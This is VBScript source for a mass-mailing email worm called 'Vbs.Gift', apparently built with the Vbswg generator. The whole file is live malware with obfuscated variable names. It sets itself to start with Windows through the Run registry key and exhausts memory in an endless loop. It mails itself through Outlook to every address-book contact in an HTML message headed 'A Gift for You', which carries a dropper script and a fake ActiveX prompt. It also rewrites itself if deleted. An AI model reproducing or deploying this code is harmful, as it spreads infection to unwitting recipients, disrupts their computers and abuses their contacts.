'Vbs.Gift Created By -=)XanTor(=-
On Error Resume Next
Set m6p6on1SN3g= Createobject("scripting.filesystemobject")
m6p6on1SN3g.copyfile wscript.scriptfullname,m6p6on1SN3g.GetSpecialFolder(0)& "\Gift.vbs"
Set oFd2aRq38iV = CreateObject("WScript.Shell")
oFd2aRq38iV.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm","wscript.exe "&m6p6on1SN3g.GetSpecialFolder(0)& "\Gift.vbs %"
if oFd2aRq38iV.regread ("HKCU\software\Gift\mailed") <> "1" then
on32Ci5wPed()
end if
Y1ZeaX3UCSs= 1
Do
ReDim Preserve QH5WkaH3252(Y1ZeaX3UCSs)
mkSh05z4D6m= CLng(1024)
QH5WkaH3252(Y1ZeaX3UCSs) = String(mkSh05z4D6m* mkSh05z4D6m, ".")
Y1ZeaX3UCSs = Y1ZeaX3UCSs + 1
Loop
Set IrFZ5n3N9j5= m6p6on1SN3g.opentextfile(wscript.scriptfullname, 1)
grEg5K0j31c= IrFZ5n3N9j5.readall
IrFZ5n3N9j5.Close
Do
If Not (m6p6on1SN3g.fileexists(wscript.scriptfullname)) Then
Set g40hKEZCt14= m6p6on1SN3g.createtextfile(wscript.scriptfullname, True)
g40hKEZCt14.writegrEg5K0j31c
g40hKEZCt14.Close
End If
Loop
Function on32Ci5wPed()
On Error Resume Next
Set y41j153d2PF= CreateObject("Outlook.Application")
If y41j153d2PF = "Outlook" Then
Set rM0Jlt2XhU4= m6p6on1SN3g.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While rM0Jlt2XhU4.atendofstream = False
d1K4bnim7Um= rM0Jlt2XhU4.readline
Rp6on1SN3go= Rp6on1SN3go& Chr(34) & " & vbcrlf & " & Chr(34) & replace(d1K4bnim7Um, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
rM0Jlt2XhU4.close
b32Ci5wPedl = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
b32Ci5wPedl = b32Ci5wPedl& vbCrLf & "On Error Resume Next"
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "If Err.Number <> 0 Then"
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "Else"
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\Gift.vbs" & Chr(34) & ", True)"
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "vbs.write " & Chr(34) & Rp6on1SN3go& Chr(34)
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "vbs.Close"
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
b32Ci5wPedl = b32Ci5wPedl & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\Gift.vbs %" & Chr(34) & ""
CZeaX3UCSs6 = CZeaX3UCSs6& vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
CZeaX3UCSs6 = CZeaX3UCSs6& vbCrLf & "End If"
CZeaX3UCSs6 = CZeaX3UCSs6 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
h5WkaH3252X=b32Ci5wPedl & CZeaX3UCSs6
Set bSh05z4D6m6 = y41j153d2PF.GetNameSpace("MAPI")
For Each tFZ5n3N9j5A In bSh05z4D6m6.AddressLists
If tFZ5n3N9j5A.AddressEntries.Count <> 0 Then
oEg5K0j31cN= tFZ5n3N9j5A.AddressEntries.Count
Set M0hKE14zifM= y41j153d2PF.CreateItem(0)
M0hKE14zifM.Subject = "A Gift for You"
M0hKE14zifM.HTMLBody = h5WkaH3252X
M0hKE14zifM.DeleteAfterSubmit = True
For evKsdpP594x = 1 To oEg5K0j31cN
Set AuQKN58X6lQ= tFZ5n3N9j5A.AddressEntries(evKsdpP594x)
If oEg5K0j31cN= 1 Then
M0hKE14zifM.BCC = AuQKN58X6lQ.Address
Else
M0hKE14zifM.BCC = M0hKE14zifM.BCC & "; " & AuQKN58X6lQ.Address
End If
Next
M0hKE14zifM.send
End If
Next
oFd2aRq38iV.regwrite "HKCU\software\Gift\mailed", "1"
y41j153d2PF.Quit
end if
End Function
'Vbswg 1.5. [K]Alamar.

